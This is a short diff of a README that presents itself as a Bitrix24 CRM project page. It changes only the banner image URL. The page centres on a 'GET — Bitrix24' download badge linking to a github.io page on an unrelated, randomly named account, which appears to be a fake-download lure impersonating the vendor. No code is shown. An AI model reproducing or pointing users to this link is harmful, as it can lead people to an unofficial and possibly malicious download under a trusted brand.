@@ -1,6 +1,6 @@
 # Bitrix24 Business Management — CRM and Team Collaboration
 
-![Banner Placeholder](https://spark.ru/upload/blogs_covers/n_68dd5012e731d.jpg)
+![Banner Placeholder](https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/0d/9a/34/0d9a34cf-c0b6-8630-4ab3-f870df3fccfe/Bitrix24AppIcon-0-0-1x_U007epad-0-1-85-220.png/1200x600wa.png)
 
 [![GET — Bitrix24](https://img.shields.io/badge/GET%20%E2%80%94%20Bitrix24-0078D6?style=for-the-badge&logoColor=white)](https://grentoolhop853.github.io/.github/Bitrix24-Business-Management)
 
